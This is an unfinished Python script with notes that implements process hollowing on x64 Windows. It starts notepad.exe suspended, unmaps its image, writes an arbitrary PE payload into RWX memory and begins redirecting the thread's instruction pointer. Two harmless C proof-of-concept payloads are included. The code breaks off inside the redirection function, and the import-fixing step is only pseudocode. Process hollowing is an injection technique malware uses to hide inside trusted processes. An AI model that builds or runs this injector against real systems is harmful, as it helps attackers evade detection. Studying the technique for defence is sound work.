"""
Note: finally working
- super messy, don't care, for now it works
- will fix up and modularise when time permits

Due to complexity of parsing/mapping PE data to memory structures
-> there will be NO 'barebones' version

Payload:
-------
Paylod examples are short POCs to prove everything works, original source below
payloads must have simple imports, not complicated forwarded imports, eg
    -> Resolving imports for api-ms-win-core-sysinfo-l1-1-0.dll...
[-] IAT api-ms-win-core-sysinfo-l1-1-0.dll -> GetTickCount @ 0x7fffdd3b30d0
[-] IAT api-ms-win-core-sysinfo-l1-1-0.dll -> GetSystemTimeAsFileTime @ 0x7fffdd3c53a0


[Payload] simple_file.cpp - write a file to disk, and genenrated an audible beep sound
Compile (VS Code -> x64 Native Tools cmd prompt) - cl.exe /MT /GS- /guard:cf- /O2 /Tc simple_file.cpp /link /GUARD:NO /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup kernel32.lib

        #include <windows.h>
        
        void mainCRTStartup() {
            HANDLE hFile = CreateFileA("C:\\Users\\Public\\hollowed.txt", 
                                        GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 
                                        FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                DWORD written;
                WriteFile(hFile, "Hollowing Successful!", 21, &written, NULL);
                CloseHandle(hFile);
            }
            Beep(1000, 500); // Audio cue
            TerminateProcess(GetCurrentProcess(), 0);
        }

[Payload] simple_msg.cpp - show simple message box
Compile (VS Code -> x64 Native Tools cmd prompt) - cl.exe /MT /GS- /O2 /Tc simple_msg.cpp /link /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup user32.lib kernel32.lib

        #include <windows.h>
        
        void mainCRTStartup() {
            // force a user32 call to initialize the subsystem -> GetDesktopWindow()
            GetDesktopWindow();
        
            // call MessageBox
            MessageBoxA(NULL, "Hollowed Process!", "Success", MB_OK);
        
            TerminateProcess(GetCurrentProcess(), 0);
        }


(prod) Process Hollowing Injection
- arch: x64 process on x64 systems / 64-bit / PE32+
- target: notepad.exe
- payload: cmd.exe


Note: this technique does NOT work with shellcode
- Windows loader expects PE file structure at base address



Steps:
------
- Create SUSPENDED process                     -> CreateProcessW()
- Unmap (hollow) process memory                -> NtUnmapViewOfSection()
- Re-allocated hollowed memory                 -> VirtualAllocEx()
- Write payload into allocated memory          -> WriteProcessMemory()
- Do stuff...
- Resume original thread                       -> ResumeThread()




1. Hollow Notepad.
2. Allocate at lpBaseAddress (wherever Windows gives you).
3. Write the Payload headers and sections.
4. Perform Base Relocation (The code above).
5. Fix the IAT (The pefile IAT code provided earlier).
6. Patch the PEB (Redirecting Windows to the new ImageBase).
7. Redirect & Resume (Using the raw buffer 1232-byte offsets).


FIX PEB
-------

FIX BASE RELOCATIONS
--------------------
Note: not needed if VirtualAllocEx() returns PE file's PreferredBase address -> Only PEB patching
1. Calculate Delta: difference between where compiler wanted the file to be, and where it is actually put in memory. If Delta == 0, no relocations necessary
2. Locate Relocation Table: retrieved from Data Directories
3. Iterate through relocation blocks: 



FIX IAT
--------
1. Parse the Import Directory: Use DIR_IMPORT (Index 1) from the Data Directory to find where the list of required DLLs starts.
2. Iterate DLLs: Each IMAGE_IMPORT_DESCRIPTOR tells you the name of a DLL (e.g., user32.dll).
3. Load DLL Locally: Use kernel32.LoadLibraryA in your Python process. (On Windows, system DLLs map to the same address in every process, so the address you find in Python is the same address needed in Notepad).
4. Resolve Functions: For every function name in that DLL, use kernel32.GetProcAddress.
5. Patch the Target: Use WriteProcessMemory to write that absolute address into the target’s IAT.
"""

import ctypes
from ctypes import wintypes
import msvcrt
import struct


kernel32    = ctypes.WinDLL('kernel32.dll', use_last_error=True)
ntdll       = ctypes.WinDLL('ntdll.dll',    use_last_error=True)


# ----------------------------------
# Payloads - sample(s)
# ----------------------------------

payload = r"C:\Users\user\simple_file.exe"

# ----------------------------------
# CONSTANTS - functions
# ----------------------------------

# specify Target Process to hollow/hijack
TARGET_PROCESS = r"c:\windows\system32\notepad.exe"


# CreateProcessW() - samples
CREATE_NO_WINDOW    = 0x08000000
DETACHED_PROCESS    = 0x08
CREATE_SUSPENDED    = 0x04

# CONTEXT64() struct
CONTEXT_ALL     = 0x10001f 
CONTEXT_CONTROL = 0x100001 

# NtQueryInformationProcess()
STATUS_MASK = 0xFFFFFFFF

# NtUnmapViewOfSection() - signed long values, for returned error codes
STATUS_SUCCESS                  = 0
STATUS_INVALID_HANDLE           = -1073741816
STATUS_INVALID_PARAMETER        = -1073741811
STATUS_NOT_MAPPED_VIEW          = -1073741799   # ref base address
STATUS_ACCESS_DENIED            = -1073741790
STATUS_PROCESS_IS_TERMINATING   = -1073741558
STATUS_INVALID_ADDRESS          = -1073741503

# ReadProcessMemory() - parsing PEB
IMAGE_BASE_OFFSET = 0x10

# VirtualAllocEx() / VirtualProtectEx ()
MEM_COMMIT              = 0x1000
MEM_RESERVE             = 0x2000
PAGE_NOACCESS           = 0x01
PAGE_READONLY           = 0x02
PAGE_READWRITE          = 0x04
PAGE_WRITECOPY          = 0x08
PAGE_EXECUTE            = 0x10
PAGE_EXECUTE_READ       = 0x20
PAGE_EXECUTE_READWRITE  = 0x40
PAGE_EXECUTE_WRITECOPY  = 0x80

# Stack and memory alignment
STACK_SIZE      = 0x1000    # 4KB (one page)
SHADOW_SPACE    = 0x20      # 32 bytes, (standard x64 calling convention)
RET_ADDR_SIZE   = 0x08      # 8 bytes (size of a 64-bit address)
ALIGNMENT_MASK  = ~0xF      # mask for 16-byte alignment

# x64 CONTEXT offsets for manual buffer packing
CTX_X64_RCX = 128
CTX_X64_RSP = 152
CTX_X64_RIP = 248
CTX_X64_CONTEXT_FLAGS = 48

# ----------------------------------
# CONSTANTS - PE file layout
# ----------------------------------

# For ease of parsing PE headers, given known field offsets and values

# ----- DOS e_lfanew offset ----- ptr to start of PE Header
PE_OFFSET                   = 0x3C  # 4 bytes

# ----- PE Signature ----- 
PE_SIGNATURE_SIZE           = 4

# ----- IMAGE_FILE_HEADER ----- 
FILE_HDR_SIZE               = 20

FILE_HDR_MACHINE            = 0x00  # 2 bytes
FILE_HDR_NUM_SECTIONS       = 0x02  # 2 bytes
FILE_HDR_TIMESTAMP          = 0x04  # 4 bytes
FILE_HDR_PTR_SYMBOL_TABLE   = 0x08  # 4 bytes
FILE_HDR_NUM_SYMBOLS        = 0x0C  # 4 bytes
FILE_HDR_SIZE_OF_OPT_HDR    = 0x10  # 2 bytes
FILE_HDR_CHARACTERISTICS    = 0x12  # 2 bytes

# ----- IMAGE_OPTIONAL_HEADER (samples) ----- 
OPT_HDR_MAGIC               = 0x00  # 2 bytes
OPT_HDR_ENTRY_POINT         = 0x10  # 4 bytes, Relative Virtual Address (RVA) of entry point
OPT_HDR_IMAGE_BASE          = 0x18  # 8 bytes 
OPT_HDR_SIZE_OF_IMAGE       = 0x38  # 4 bytes
OPT_HDR_SIZE_OF_HEADERS     = 0x3C  # 4 bytes


# ----- OPT_DATA DIRECTORIES ----- 
OPT_HDR_DATA_DIRECTORIES    = 0x70
DATA_DIRECTORY_SIZE         = 8     # 8 bytes, total size for one entry
NUM_DATA_DIRECTORIES        = 16

# ----- OPT_DATA DIRECTORY SUB-FIELDS ----- 
# offsets relative to each entry (below)
DATA_DIR_VIRTUAL_ADDRESS    = 0x00  # 4 bytes
DATA_DIR_SIZE               = 0x04  # 4 bytes

# ----- OPT_DATA DIRECTORY INDICES -----
DIR_EXPORT                  = 0
DIR_IMPORT                  = 1
DIR_RESOURCE                = 2
DIR_EXCEPTION               = 3
DIR_SECURITY                = 4
DIR_BASERELOC               = 5
DIR_DEBUG                   = 6
DIR_ARCHITECTURE            = 7
DIR_GLOBALPTR               = 8
DIR_TLS                     = 9
DIR_LOAD_CONFIG             = 10
DIR_BOUND_IMPORT            = 11
DIR_IAT                     = 12
DIR_DELAY_IMPORT            = 13
DIR_COM_DESCRIPTOR          = 14


# ----- IMAGE_SECTION_HEADER ----- 
SECTION_HEADER_SIZE = 40            # 40 byte header size

SEC_HDR_NAME                = 0x00  # 8 bytes
SEC_HDR_VIRTUAL_SIZE        = 0x08  # 4 bytes
SEC_HDR_VIRTUAL_ADDRESS     = 0x0C  # 4 bytes
SEC_HDR_SIZE_OF_RAW_DATA    = 0x10  # 4 bytes
SEC_HDR_PTR_TO_RAW_DATA     = 0x14  # 4 bytes
SEC_HDR_PTR_TO_RELOC        = 0x18  # 4 bytes
SEC_HDR_LINENO_PTR          = 0x1C  # 4 bytes  
SEC_HDR_RELOC_COUNT         = 0x20  # 2 bytes  
SEC_HDR_LINENO_COUNT        = 0x22  # 2 bytes  
SEC_HDR_CHARACTERISTICS     = 0x24  # 4 bytes

# ----- RELOCATION TABLE BLOCKS -----
RELOC_BLOCK_HEADER_SIZE     = 8         # PageRVA and BlockSize, 4-Bytes each
RELOC_ENTRY_SIZE            = 2         # size of each TypeOffset entry (Bytes)
RELOC_TYPE_BITSHIFT         = 12        # Type, in top 4-bits of TypeOffset entry
RELOC_OFFSET_MASK           = 0x0FFF    # Offset, in bottom 12-bits of TypeOffset entry


# ----------------------------------
# Struct Definitions
# ----------------------------------

class SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("nLength",                 wintypes.DWORD),
        ("lpSecurityDescriptor",    wintypes.LPVOID),
        ("bInheritHandle",          wintypes.BOOL),
    ]

class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb",                wintypes.DWORD),
        ("lpReserved",        wintypes.LPWSTR),
        ("lpDesktop",         wintypes.LPWSTR),
        ("lpTitle",           wintypes.LPWSTR),
        ("dwX",               wintypes.DWORD),
        ("dwY",               wintypes.DWORD),
        ("dwXSize",           wintypes.DWORD),
        ("dwYSize",           wintypes.DWORD),
        ("dwXCountChars",     wintypes.DWORD),
        ("dwYCountChars",     wintypes.DWORD),
        ("dwFillAttribute",   wintypes.DWORD),
        ("dwFlags",           wintypes.DWORD),
        ("wShowWindow",       wintypes.WORD),
        ("cbReserved2",       wintypes.WORD),
        ("lpReserved2",       wintypes.LPBYTE),
        ("hStdInput",         wintypes.HANDLE),
        ("hStdOutput",        wintypes.HANDLE),
        ("hStdError",         wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess",    wintypes.HANDLE),
        ("hThread",     wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId",  wintypes.DWORD),    
    ]

# for querying Process Environment Block
# - PebBaseAddress required for parsing memory of a process
# - 48 bytes in size -> passed in ctypes.sizeof(pbi)

class PROCESS_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
    ("ExitStatus",                  ctypes.c_void_p),
    ("PebBaseAddress",              ctypes.c_void_p),
    ("AffinityMask",                ctypes.c_void_p),
    ("BasePriority",                ctypes.c_void_p),
    ("UniqueProcessId",             ctypes.c_void_p),
    ("InheritedFromUniqueProcessId",ctypes.c_void_p),
    ]


# ----------------------------------
# Function Prototypes
# ----------------------------------

# ------------------- kernel32.dll -------------------
kernel32.CloseHandle.argtypes = [ wintypes.HANDLE, ]  # hObject
kernel32.CloseHandle.restype = wintypes.BOOL

kernel32.GetProcAddress.argtypes = [
    wintypes.HANDLE,        # Module
    wintypes.LPCSTR,        # lpProcName
]
kernel32.GetProcAddress.restype = ctypes.c_void_p


kernel32.CreateProcessW.argtypes =[
    wintypes.LPCWSTR,                       # lpApplicationName (opt)
    wintypes.LPWSTR,                        # [i/o] lpCommandLine (opt)
    ctypes.POINTER(SECURITY_ATTRIBUTES),    # lpProcessAttributes (opt)
    ctypes.POINTER(SECURITY_ATTRIBUTES),    # lpThreadAttributes (opt)
    wintypes.BOOL,                          # bInheritHandles
    wintypes.DWORD,                         # dwCreationFlags
    ctypes.c_void_p,                        # lpEnvironment (opt)
    wintypes.LPCWSTR,                       # lpCurrentDirectory (opt)
    ctypes.POINTER(STARTUPINFOW),           # lpStartupInfo
    ctypes.POINTER(PROCESS_INFORMATION),    # [o] lpProcessInformation
]
kernel32.CreateProcessW.restype = wintypes.BOOL


kernel32.CreateRemoteThread.argtypes = [
    wintypes.HANDLE,                        # hProcess
    ctypes.POINTER(SECURITY_ATTRIBUTES),    # lpThreadAttributes
    ctypes.c_size_t,                        # dwStackSize
    ctypes.c_void_p,                        # lpStartAddress
    wintypes.LPVOID,                        # lpParameter
    wintypes.DWORD,                         # dwCreationFlags
    ctypes.POINTER(wintypes.DWORD),         # lpThreadId   
]
kernel32.CreateRemoteThread.restype = wintypes.HANDLE

kernel32.GetThreadContext.argtypes = [
    wintypes.HANDLE,        # hThread
    ctypes.c_void_p,        # lpContext (no longer ctypes.Structure)
]
kernel32.GetThreadContext.restype = wintypes.BOOL

kernel32.LoadLibraryA.argtypes = [
    wintypes.LPCSTR,        # lpLibFileName
]
kernel32.LoadLibraryA.restype = wintypes.HMODULE

kernel32.ReadProcessMemory.argtypes = [
    wintypes.HANDLE,                    # hProcess
    wintypes.LPCVOID,                   # lpBaseAddress
    wintypes.LPVOID,                    # [o] lpBuffer
    ctypes.c_size_t,                    # nSize
    ctypes.POINTER(ctypes.c_size_t),    # [o] lpNumberOfBytesRead
]
kernel32.ReadProcessMemory.restype = wintypes.BOOL


kernel32.SetThreadContext.argtypes = [
    wintypes.HANDLE,        # hThread
    ctypes.c_void_p,        # *lpContext (no longer ctypes.Structure)
]
kernel32.SetThreadContext.restype = wintypes.BOOL


kernel32.VirtualAllocEx.argtypes = [
    wintypes.HANDLE,        # hProcess
    wintypes.LPVOID,        # lpAddress (opt) (can be null)
    ctypes.c_size_t,        # dwSize
    wintypes.DWORD,         # flAllocationType
    wintypes.DWORD,         # flProtect
]
kernel32.VirtualAllocEx.restype = wintypes.LPVOID


kernel32.VirtualProtectEx.argtypes = [
    wintypes.HANDLE,                    # hProcess
    wintypes.LPVOID,                    # lpAddress
    ctypes.c_size_t,                    # dwSize
    wintypes.DWORD,                     # flNewProtect (see CONSTANTS)
    ctypes.POINTER(wintypes.DWORD),     # [o] lpflOldProtect
]
kernel32.VirtualProtectEx.restype = wintypes.BOOL


kernel32.WriteProcessMemory.argtypes = [
    wintypes.HANDLE,                    # hProcess
    wintypes.LPVOID,                    # lpBaseAddress
    wintypes.LPCVOID,                   # lpBuffer
    ctypes.c_size_t,                    # nSize
    ctypes.POINTER(ctypes.c_size_t),    # [o] *lpNumberOfBytesWritten
]
kernel32.WriteProcessMemory.restype = wintypes.BOOL


# ------------------- ntdll.dll -------------------
ntdll.NtQueryInformationProcess.argtypes = [
        wintypes.HANDLE,                # ProcessHandle
        ctypes.c_int,                   # ProcessInformationClass
        ctypes.c_void_p,                # [o] ProcessInformation
        ctypes.c_ulong,                 # ProcessInformationLength
        ctypes.POINTER(ctypes.c_ulong), # [o] ReturnLength (opt)
]
ntdll.NtQueryInformationProcess.restype = ctypes.c_long


ntdll.NtUnmapViewOfSection.argtypes = [
    wintypes.HANDLE,        # ProcessHandle
    ctypes.c_void_p,        # BaseAddress (opt)
]
ntdll.NtUnmapViewOfSection.restype = ctypes.c_long


# ----------------------------------
# Function Definitions
# ----------------------------------

# --------------- PE parser helper functions ---------------
#
# [DOS Header: e_lfanew] ---\    [DOS Stub]   /--> [PE Header]
#                            \_ _ _ _ _ _ _ _/
#
# e_lfanew ->   [PE Signature       - 4 bytes]
#               [File Header        - 20 bytes]
#               [Optional Header    - variable]
#               [Section Table      - num. Sections x 40bytes]


# Previosly, subsequent helper functions assumeed/referred to initial pe_offset being defined
# - now, all standalone in that only arg passed is f:object

# ----- Offset-Of -----

def get_pe_header_offset(f: object) -> int:
    f.seek(PE_OFFSET)
    pe_offset = struct.unpack('<I', f.read(4))[0]

    return pe_offset

def get_file_header_offset(f: object) -> int:
    pe_offset = get_pe_header_offset(f)
    file_header_offset = pe_offset + PE_SIGNATURE_SIZE

    return file_header_offset

def get_optional_header_offset(f: object) -> int:
    pe_offset = get_pe_header_offset(f)
    opt_header_offset = pe_offset + PE_SIGNATURE_SIZE + FILE_HDR_SIZE

    return opt_header_offset

def get_reloc_dir_offset(f: object) -> int:
    optional_header_offset = get_optional_header_offset(f)
    reloc_dir_offset = optional_header_offset + OPT_HDR_DATA_DIRECTORIES + (DIR_BASERELOC * DATA_DIRECTORY_SIZE)
    
    return reloc_dir_offset
    
def get_section_table_offset(f: object) -> int:
    pe_offset = get_pe_header_offset(f)
    size_optional_header = get_size_optional_header(f)
    section_table_offset = pe_offset + PE_SIGNATURE_SIZE + FILE_HDR_SIZE + size_optional_header

    return section_table_offset

def get_size_of_image_offset(f: object) -> int:
    optional_header_offset = get_optional_header_offset(f)
    size_of_image_offset = optional_header_offset + OPT_HDR_SIZE_OF_IMAGE
    
    return size_of_image_offset

# ----- Size-Of -----

def get_size_optional_header(f: object) -> int:
    file_header_offset = get_file_header_offset(f)
    f.seek(file_header_offset + FILE_HDR_SIZE_OF_OPT_HDR)
    size_of_opt_header = struct.unpack('<H', f.read(2))[0]

    return size_of_opt_header

def get_size_of_headers(f: object) -> int:

    optional_header_offset = get_optional_header_offset(f)
    f.seek(optional_header_offset + OPT_HDR_SIZE_OF_HEADERS)
    size_of_headers = struct.unpack('<I', f.read(4))[0]

    return size_of_headers


def get_size_of_image(f:object) -> int:
    """ Size of file in memory, NOT the file size on disk, SizeOfImage > SizeOfFileOnDisk """

    size_of_image_offset = get_size_of_image_offset(f)
    f.seek(size_of_image_offset)
    size_of_image = struct.unpack('<I', f.read(4))[0]

    return size_of_image

# ----- Number-Of -----

def get_number_of_sections_in_section_table(f) -> int:
    file_header_offset = get_file_header_offset(f)
    f.seek(file_header_offset + FILE_HDR_NUM_SECTIONS)
    num_sections = struct.unpack('<H', f.read(2))[0]

    return num_sections


def get_oep_rva(payload: str) -> int:
    """ 
    Return the OEP_RVA of the binary, ON-DISK
    - Original Entry Point, Relative Virtual Address
    - ie, AddressOfEntryPoint field, within Optional Header
    - NOT an absolute address -> RELATIVE to the image base

    To get address of entrypoint, IN MEMORY
    - entry_point_va = img_base_addr + oep_rva
    """

    print(f"\n[+] Extracting Original Entry Point, Relative Virtual Address:")
    print(f"    -> Payload: {payload}")

    with open(payload, 'rb') as f:
        pe_offset = get_pe_header_offset(f)
        optional_header_offset = get_optional_header_offset(f)
        f.seek(optional_header_offset + OPT_HDR_ENTRY_POINT)

        oep_rva = struct.unpack('<I', f.read(4))[0]
        print(f"    -> oep_rva: {hex(oep_rva)}")

    return oep_rva


def fix_iat_for_hollowing():
    """ Pseudo-Code here """
    
    # Parse Import Directory
    # - Payload -> Optional Header -> DataDirectory entry for Imports
    # 
    # Iterate through DLLs
    # - foreach IMAGE_IMPORT_DESCRIPTOR, extract DLL name (eg kernel32.dll)
    #
    # Load DLL locally
    # - use LoadLibraryA in injector
    # - system DLLs map to same address across processes
    # - so address found in injector, will be valid in target
    #
    # Resolve Function Addresses
    # - iterate through Thunk Data (function list)
    # - foreach function, call GetProcAddress() to get absolute memory address
    #
    # Overwrite Remote IAT
    # - use WriteProcessMemory to patch the resolved absolute address
    # - into the FirstThunk (actual IAT) in target process
    

# --------------- Misc helper functions ---------------

def winerr() -> OSError:
    """ Return a ctypes.WinError() with the last Windows API error """

    return ctypes.WinError(ctypes.get_last_error())


def close_handle(handle: wintypes.HANDLE, name: str="Handle") -> None:
    """ Close open handles, to avoid resource leaks """

    print(f"[+] Closing Handle {handle.value} to {name}: ", end='', flush=True)

    if handle is None or handle.value == 0:
        print(f"[!] Warning: {name} is None or invalid, nothing to close")
        return

    if not kernel32.CloseHandle(handle):
        print(f"Failed! Error: {winerr()}")
    else:
        print(f"Successful")


def pause(warning=False) -> None:
    """ Pause until user key press (any) """

    if warning:
        print("\n\n[!] WARNING: About to execute payload: ResumeThread()")
        print("Press any key to continue...", end='', flush=True)
    else:
        print("\n\nPress any key to continue...", end='', flush=True)

    msvcrt.getch()
    print()


def print_hdr(hdr: str) -> None:
    border = "-" * len(hdr.strip())
    print(f"\n{border}{hdr}{border}")


# --------------- Create SUSPENDED Process ---------------


def create_process(
    app: str=TARGET_PROCESS,
    flags: int=CREATE_SUSPENDED
) -> tuple[wintypes.HANDLE, wintypes.HANDLE,
           wintypes.DWORD, wintypes.DWORD]:

    """ 
    Create process in SUSPENDED state (default)
    - return HANDLEs and Ids to thread/process
    """

    hdr = "\n >>>>    Creating SUSPENDED Process -> CreateProcessW()    <<<<\n"
    print_hdr(hdr)

    # define args
    lpApplicationName = app
    lpCommandLine = None
    lpProcessAttributes = None
    lpThreadAttributes = None
    bInheritHandles = False
    dwCreationFlags = flags
    lpEnvironment = None
    lpCurrentDirectory = None

    lpStartupInfo = STARTUPINFOW()
    lpStartupInfo.cb = ctypes.sizeof(STARTUPINFOW)
    lpProcessInformation = PROCESS_INFORMATION()

    # spawn process
    try:
        if not kernel32.CreateProcessW(
            lpApplicationName,
            lpCommandLine,
            lpProcessAttributes, 
            lpThreadAttributes, 
            bInheritHandles, 
            dwCreationFlags, 
            lpEnvironment, 
            lpCurrentDirectory, 
            ctypes.byref(lpStartupInfo), 
            ctypes.byref(lpProcessInformation)
        ):
            raise winerr()

        print(f"-> Process created: {lpApplicationName}")
        
        # return handles/Ids to thread and process
        # NOTE: probably don't need to return everything here...
        hThread = wintypes.HANDLE(lpProcessInformation.hThread)
        hProcess = wintypes.HANDLE(lpProcessInformation.hProcess)  
        dwThreadId = lpProcessInformation.dwThreadId
        dwProcessId = lpProcessInformation.dwProcessId
        
        return hThread, hProcess, dwThreadId, dwProcessId
        
    except OSError as e:
        raise OSError(f"\n[!] CreateProcessW() Failed, Application: {app}, Error: {e}")


# --------------- Gathering Process Information ---------------


def get_img_base_addr(hProcess: wintypes.HANDLE) -> tuple[PROCESS_BASIC_INFORMATION(), ctypes.c_void_p]:

    """
    Return the ImageBaseAddress (from PEB)
    - this field contains the virtual address in memory, where .exe file loaded
    - functions, variables etc inside program, are all located at specific offsets relative to this address
    - this value is required to navigate process' memory -> read PE header, find entry point etc

    Why:
    ----
    1. Mapping Destination
    - compiled PEs have a preferred 'ImageBaseAddress'
    - when calling VirtualAllocEx(), this is where the file wants to be loaded in memory
    - if memory can be allocated at that preferred memory address, payload is already 'at home'
    - otherwise, memory must be mapped at different address, and delta must be applied to relocations
    
    2. Rebasing, fixing Absolute Addresses
    - most compiled binaries use 'absolute addresses' for globals and jump tables
    - PAYLOAD compiled expecting to live at 'ImageBaseAddress'
    - pointers all point to dead space -> must be adjusted, in reference to 'ImageBaseAddress'

    

    Step 1:
    - call NtQueryInformationProcess() <- PBI struct populated
    
    Step 2:
    - from PBI struct, query PebBaseAddress variable
    - PebBaseAddress is a pointer to where PEB starts in memory
    - at offset 0x10 (from PebBaseAddress), sits ImageBaseAddress
    - read PEB at PebBaseAddress + OFFSET <- ReadProcessMemory()

    Glossary
    - PBI, Process Basic Information (struct)
    - PEB, Process Environment Block (struct)
    """

    # Step 1: populate PBI struct
    print(f"\n[+] Retrieving Process Basic Information: NtQueryInformationProcess()")

    pbi = PROCESS_BASIC_INFORMATION()
    pi_len = ctypes.c_ulong()
    ProcessInformationClass = 0 # return ProcessBasicInformation

    status = ntdll.NtQueryInformationProcess(
        hProcess,
        ProcessInformationClass, 
        ctypes.byref(pbi),
        ctypes.sizeof(pbi),
        ctypes.byref(pi_len)
    )
    
    if status != 0:
        print(f"[!] Failed to query process info: {hex(status & STATUS_MASK)}")
        raise winerr()
    
    print(f"    -> PBI retrieved...")


    # Step 2: query PebBaseAddress
    print(f"\n[+] Parsing PEB to retrieve Image Base Address: ReadProcessMemory()")

    image_base = ctypes.c_void_p()      # buffer to populate


    if not kernel32.ReadProcessMemory(
        hProcess,
        pbi.PebBaseAddress + IMAGE_BASE_OFFSET, # lpBaseAddress
        ctypes.byref(image_base),               # [o] lpBuffer
        ctypes.sizeof(image_base),
        None
    ):
        raise winerr()

    print(f"    -> img_base_addr: {hex(image_base.value)}")

    return pbi, image_base.value


# --------------- Calculating Entry Point ---------------


def get_entry_point_va(img_base_addr: int, oep_rva: int) -> int:
    """ Return the Entry Point of the application, IN MEMORY """

    entry_point_va = img_base_addr + oep_rva

    print(f"\n[+] Re-using existing Entry Point at: {hex(entry_point_va)}")
    print(f"    -> entry_point_va = img_base_addr + oep_rva")

    print(f"\n\n[+] NOTE: above memory address \"entry_point_va\", will have the following:")
    print(" -> Payload written to here\n -> Instruction Pointer redirected to here\n")

    return entry_point_va


# --------------- Memory Manipulation ---------------


def hollow_process(
            hProcess: wintypes.HANDLE,
            base_address: ctypes.c_void_p
) -> None:
    """ Unmap ('hollow out') the memory address space of target process """

    print(f"\n[+] Un-mapping process memory -> NtUnmapViewOfSection()")

    status = ntdll.NtUnmapViewOfSection(hProcess, base_address)

    if status != 0:
        print(f"[!] Failed, Status Code: {status}")
        raise winerr()
    
    print(f"    -> Error Status Code: {status}")
    print(f"    -> Successful, hollowed-out target memory at: {hex(base_address)}")




def get_size_of_payload(payload: str) -> int:
    """
    Retrieve SizeOfImage -> memory size (bytes) that must be reserved/committed to load payload
    - including all sections in Section Table
    - footprint of file in virtual memory, NOT the file size on disk
    - ie SizeOfImage > SizeOfFileOnDisk
    - field exists within Optional Header, @ 56-byte (0x38) offset
    """

    with open(payload, 'rb') as f:

        # 1. Jump to end of DOS header (0x3C), read last field 'e_lfanew'
        pe_offset = get_pe_header_offset(f)

        # 2. Jump to start of Optional Header
        optional_header_offset = get_optional_header_offset(f)
        
        # 3. SizeOfImage at Offset 56 within Optional Header
        size_of_image_offset = optional_header_offset + OPT_HDR_SIZE_OF_IMAGE
        
        f.seek(size_of_image_offset)
        size_of_image = struct.unpack('<I', f.read(4))[0]
        
        return size_of_image
    



def virtual_alloc_ex(
    hProcess: wintypes.HANDLE,
    lpAddress: ctypes.c_void_p,
    dwSize: ctypes.c_size_t
) -> wintypes.LPVOID:

    """
    Allocate memory space in suspended process
    - returns pointer to allocated memory, in remote process
    
    Requesting allocation address same as img_base_addr
    - if not available, ptr= assignment should fail and error out
    """

    hdr = "\n>>>>    Allocating Memory -> VirtualAllocEx()    <<<<\n"
    print("\n" + "-" *len(hdr) + hdr + "-" *len(hdr))
    
    ptr = kernel32.VirtualAllocEx(hProcess,
                            lpAddress,
                            dwSize,
                            MEM_COMMIT | MEM_RESERVE,
                            PAGE_EXECUTE_READWRITE) # red flag but fine for PoC

    if not ptr:
        raise winerr()
    
    print(f"    -> Successful, base address: {hex(ptr)}")
    is_equal = True if hex(ptr) == hex(lpAddress) else False
    print(f"    [INFO] Was requested address granted: {is_equal}")
    
    return ptr




def write_payload(
    hProcess: wintypes.HANDLE,
    lpBaseAddress: wintypes.LPVOID,
    payload: str) -> None:
    
    """
    (PE File)
    ---------
    Manually parsing PE file on disk (eg cmd.exe)
    - writing/mapping headers and sections, based on known PE file structure -> offsets and byte-lengths
    
    Minimise offset math with raw numbers
    ie, instead of  -> opt_header_offset = pe_offset + 4 + 20
    use following   -> opt_header_offset = pe_offset + PE_SIGNATURE_SIZE + FILE_HDR_SIZE
        [PE Signature       - 4 bytes]
        [File Header        - 20 bytes]
        [Optional Header    - variable]
        [Section Table      - no Sections x 40bytes]
    """

    with open(payload, 'rb') as f:

        size_of_headers = get_size_of_headers(f)    # get how many bytes in header section
        f.seek(0)                                   # go back to beginning of file
        header_buffer = f.read(size_of_headers)     # read in bytes of size 'size_of_headers'
        bytes_written = ctypes.c_size_t(0)          # pointer to number of byte written
        
        print(f"\n[+] Writing Header Information: WriteProcessMemory()")
        
        if not kernel32.WriteProcessMemory(
            hProcess, 
            ctypes.c_void_p(lpBaseAddress), 
            header_buffer, 
            size_of_headers, 
            ctypes.byref(bytes_written)    # lpNumberOfBytesWritten (optional)
        ):
            raise winerr()

        print(f"    -> Headers written: {bytes_written.value} bytes")
        print()

        # Section Table - map/write
        # - the Section Table, is an array of Section Headers
        # - section[S] will include .text, .data, .rsrc, .reloc etc
        num_sections = get_number_of_sections_in_section_table(f)
        section_table_offset    = get_section_table_offset(f)
        
        for i in range(num_sections):

            # iterate through each Section Header in the Section Table[]
            entry_offset = section_table_offset + (i * SECTION_HEADER_SIZE)
            
            # read name of the section (.data, .text etc)
            f.seek(entry_offset)
            name_bytes = f.read(8)
            section_name = name_bytes.split(b'\x00')[0].decode(errors='ignore')
            
            # read VirtualAddress, RawDataSize and RawDataPointer info (Offsets 12, 16, 20)
            # virt_addr -> where section will be loaded into target-process' virtual memory
            # raw_size  -> size of raw data (how much data to copy)
            # raw_ptr   -> offset within file, where section's raw data begins
            
            f.seek(entry_offset + SEC_HDR_VIRTUAL_ADDRESS)
            virt_addr, raw_size, raw_ptr = struct.unpack('<III', f.read(12))
            
            
            # actual mapping of section -> target process' memory
            # raw data (@ raw_ptr) read from disk -> written to allocated memory of target process
            if raw_size > 0:
                # jump to the code/data on disk
                f.seek(raw_ptr)
                section_bytes = f.read(raw_size)
                
                # Destination = Target Base + Virtual Off   set
                dest = lpBaseAddress + virt_addr
                
                if not kernel32.WriteProcessMemory(
                    hProcess, 
                    ctypes.c_void_p(dest), 
                    section_bytes, 
                    raw_size, 
                    None    # lpNumberOfBytesWritten (optional)
                ):
                    raise winerr()

                print(f"Mapped section {section_name:10} -> {hex(dest)} (size: {hex(raw_size)})")


# --------------- Execution Redirection ---------------


def redirect_to_payload(
        hThread: wintypes.HANDLE,
        entry_point_va: int
) -> None:

    """
    Retrieve CPU-register info for target hThread
    - re-direct Instruction Pointer (Rip) to new entry point
    """
    
    # Get original_rip, using 1232-byte raw-buffer + 16 for manual alignment
    
    
    raw_buffer = ctypes.create_string_buffer(1232 + 16)
    # this is just the memory location
    aligned_addr = (ctypes.addressof(raw_buffer) + 0xF) & ALIGNMENT_MASK 
    # map chcar array onto the aligned address -> struct.pack_into() / unpack_from()
    aligned_buffer = (ctypes.c_char * 1232).from_address(aligned_addr)
